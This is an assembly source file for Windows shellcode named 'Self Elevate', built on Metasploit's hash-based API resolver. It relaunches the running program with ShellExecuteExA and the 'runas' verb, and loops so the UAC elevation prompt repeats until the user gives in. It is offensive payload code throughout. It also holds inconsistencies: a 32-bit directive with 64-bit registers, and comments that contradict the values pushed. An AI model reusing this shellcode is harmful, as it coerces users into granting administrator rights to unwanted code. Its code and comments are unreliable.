; Self Elevate
; Author: Ege Balcı
; Size: 343 bytes
;


[BITS 32]
 
    cld                          ; Clear direction flags
    call start                   ; Get the address of api block to stack
	%include "../block_api.asm"  ; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
start:
    pop rbp                      ; Pop the address of api block
elevate:
 	sub rsp,0x1a8			     ; szPath[MAX_PATH]
	xor rcx,rcx                  ; NULL
	mov rdx,rsp                  ; &szPath
	mov rsi,rsp                  ; Save &szPath to RSI for later
	mov r8,0x1a8                 ; ARRAYSIZE(szPath)
	mov r10d,0xFE61445D          ; hash( "KERNEL32.dll", "GetModuleFileNameA" )
	call rbp                     ; GetModuleFileName(NULL,szPath,ARRAYSIZE(szPath))	
;--------------------------------;
	mov rbx,0x006c6c642e32336c   ; "lld.32l"
	push rbx                     ; ...
	mov rbx,0x6c65687300000000   ; "lesh",0x00
	push rbx                     ; ...
	lea rcx,[rsp+4]              ; &"shell32.dll"
	mov r10d,0x0726774C          ; hash( "KERNEL32.dll", "LoadLibraryA" )
	call rbp                     ; LoadLibraryA(&"shell32.dll")
;--------------------------------;	
	mov rbx,0x0073616e75720000   ; "runas",0x00
	push rbx                     ; ...
	lea rbx,[rsp+2]              ; Save &"runas" to RBX
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x01              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push rsi                     ; SHELLEXECUTEINFO.lpFile = szPath
	push rbx                     ; SHELLEXECUTEINFO.lpVerb = "runas"
	push qword 0x00              ; SHELLEXECUTEINFO.hwnd = 0
    push qword 0x70              ; SHELLEXECUTEINFO.cbSize = 0x3c
	mov rcx,rsp                  ; Move &SHELLEXECUTEINFO to EDI
	push qword 0x01              ; argc
	mov r10d,0x02A9E686          ; hash( "SHELL32.dll", "ShellExecuteExA" )
	call rbp                     ; ShellExecuteExA(&SHELLEXECUTEINFO)
	add rsp,0x298                ; Fix the stack 
	test rax,rax                 ; Check error
	jz elevate                   ; Ask until process elevates ;)
